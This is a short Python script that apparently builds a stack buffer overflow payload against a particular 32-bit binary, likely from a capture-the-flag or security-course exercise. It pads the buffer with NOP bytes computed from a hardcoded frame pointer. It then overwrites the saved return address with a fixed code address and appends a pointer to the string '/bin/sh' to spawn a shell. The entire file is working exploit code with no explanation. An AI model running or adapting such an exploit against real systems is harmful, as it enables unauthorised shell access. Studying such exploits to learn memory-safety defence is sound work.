from struct import pack

ebp = 0xbffef468
buf = ebp - 8 - 10
padding = '\x90' * (ebp - buf + 4)

return_addr = pack("<I", 0x08048eed)
command_addr = pack("<I", ebp + 12)
command = '/bin/sh'

print padding + return_addr + command_addr + command
